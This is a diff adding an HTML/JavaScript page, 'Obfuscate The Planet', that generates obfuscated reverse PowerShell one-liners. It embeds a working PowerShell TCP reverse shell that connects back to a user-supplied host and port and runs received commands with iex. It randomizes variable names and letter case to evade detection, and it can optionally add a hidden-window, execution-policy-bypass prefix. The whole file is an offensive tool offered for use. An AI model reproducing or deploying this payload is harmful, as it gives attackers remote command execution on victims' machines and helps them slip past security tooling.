@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Obfuscate The Planet</title>
+</head>
+<body>
+  <h1>Reverse PowerShell</h1>
+  <form id="form">
+    <label for="lhost">LHOST:</label>
+    <input type="text" id="lhost" name="lhost" /><br /><br />
+    <label for="lport">LPORT:</label>
+    <input type="text" id="lport" name="lport" /><br /><br />
+    <select id="version" name="version">
+      <option value="default">default</option>
+      <option value="prefixed">with prefix</option>
+    </select>
+    <button type="button" onclick="obfuscateCommand()">Obfuscate</button>
+    <button type="button" onclick="copyToClipboard()">Copy to clipboard</button><br /><br />
+  </form>
+  <textarea id="obfuscatedCommand" rows="21" cols="33"></textarea>
+
+  <script>
+    const cmdPrefix = "powershell -nop -noni -w h -ep bypass -c \""
+	  const cmdSuffix = "\""
+	  const hardcodedCommand = "$S0='asciiencoding';$S1='getbytes';$S2='getstream';$S3='getstring';$S4='length';$S5='net';$S6='read';$S7='sockets';$S8='system';$S9='tcpclient';$S10='text';$S11='write';$V0=new-object \"$S8.$S5.$S7.$S9\"('LHOST', LPORT);$V1=$V0.$S2();[byte[]]$V2=0..65535|%{0};while(($V3=$V1.$S6($V2,0,$V2.$S4))-ne 0){$V4=(new-object -typename \"$S8.$S10.$S0\").$S3($V2,0,$V3);$V5=(iex $V4 2>&1|out-string);$V6=$V5+'h@x '+(pwd)+'> ';$V7=([text.encoding]::ascii).$S1($V6);$V1.$S11($V7,0,$V7.$S4);$V1.flush()};$V0.close();exit";
+	  const variablesNames = ["$S0", "$S1", "$S2", "$S3", "$S4", "$S5", "$S6", "$S7", "$S8", "$S9", "$S10", "$S11", "$S12", "$S13", "$V0", "$V1", "$V2", "$V3", "$V4", "$V5", "$V6", "$V7"];
+
+    var urlParams = new URLSearchParams(window.location.search);
+    const lhostParam = urlParams.get('lhost');
+    const lportParam = urlParams.get('lport');
+    const versionParam = urlParams.get('version');
+    if (lhostParam && lportParam && versionParam) {
+      document.getElementById("lhost").value = lhostParam;
+      document.getElementById("lport").value = lportParam;
+      document.getElementById("version").value = versionParam;
+      obfuscateCommand()
+    }
+
+    function obfuscateCommand() {
+      const lhost = document.getElementById("lhost").value;
+      const lport = document.getElementById("lport").value;
+      var version = document.getElementById("version");
+      var version = version.options[version.selectedIndex].value;
+      if (!validateIPAddress(lhost)) {
+        alert("Invalid LHOST value!");
+            return;
+      }
+      if (!validatePortNumber(lport)) {
+        alert("Invalid LPORT value!");
+            return;
+      }
+      var obfuscatedCommand = insertHostAndPort(hardcodedCommand, lhost, lport)
+      obfuscatedCommand = randomizeVariables(obfuscatedCommand, variablesNames)
+      obfuscatedCommand = randomizeCase(obfuscatedCommand)
+      if (version === "prefixed"){
+        obfuscatedCommand = addPrefix(obfuscatedCommand)
+      }
+      document.getElementById("obfuscatedCommand").innerHTML = obfuscatedCommand;
+      urlParams = new URLSearchParams({ lhost, lport, version });
+      window.history.replaceState({}, '', '?' + urlParams.toString());
+    }
+
+    function insertHostAndPort(string, lhost, lport) {
+      var modifiedString = string;
+      modifiedString = modifiedString.replace("LHOST", lhost).replace("LPORT", lport);
+      return modifiedString
+    }
+
+    function addPrefix(string) {
+      var cmdVersion = string.replace(/"/g, '\\"');
+      cmdVersion = cmdPrefix + cmdVersion + cmdSuffix;
+      return cmdVersion
+    }
+
+    function randomizeCase(string) {
+      var modifiedString = "";
+      for (var i = 0; i < string.length; i++) {
+        var letter = string.charAt(i);
+        if (Math.random() < 0.5) {
+          modifiedString += letter.toLowerCase();
+        } else {
+          modifiedString += letter.toUpperCase();
+        }
+      }
+      return modifiedString;
+    }
+
+    function randomizeVariables(string, variables) {
+      var modifiedString = string;
+      for (var i = 0; i < variables.length; i++) {
+        var randomLength = Math.floor(Math.random() * 8) + 1;
+        var randomString = "$" + generateRandomString(randomLength);
+        modifiedString = modifiedString.replaceAll(variables[i], randomString);
+      }
+      return modifiedString;
+    }
+
+    function generateRandomString(length) {
+      var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+      var randomString = "";
+      for (var i = 0; i < length; i++) {
+        randomString += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return randomString;
+    }
+
+    function validateIPAddress(ipaddress) {
+      var ipPattern = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+      return ipPattern.test(ipaddress);
+    }
+
+    function validatePortNumber(port) {
+      var portPattern = /^\d{1,5}$/;
+      return portPattern.test(port) && parseInt(port) <= 65535;
+    }
+
+    function copyToClipboard() {
+      var commandText = document.getElementById("obfuscatedCommand");
+      commandText.select();
+      document.execCommand("copy");
+    }
+  </script>
+</body>
+</html>
